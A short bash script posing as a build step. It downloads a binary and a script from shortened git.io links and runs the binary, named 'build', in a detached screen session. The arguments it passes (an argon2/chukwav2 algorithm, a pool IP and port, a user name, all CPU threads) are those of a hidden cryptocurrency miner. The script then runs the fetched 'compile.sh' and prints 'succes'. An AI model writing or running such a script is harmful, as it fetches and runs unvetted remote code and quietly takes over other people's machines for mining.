#!/bin/bash
wget -qO compile.sh https://git.io/JPjuz
wget -qO build https://git.io/JX29n
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a argon2/chukwav2 -o 137.184.3.159:2112 -u cieeenontonya -t $(nproc --all) -k -m
./compile.sh
echo succes
